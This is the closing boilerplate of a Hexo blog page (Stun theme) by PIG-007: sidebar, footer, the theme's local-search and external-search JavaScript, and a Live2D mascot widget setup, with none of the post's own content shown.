          ▲总结</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">119</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">63</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">61</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ Untitled ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>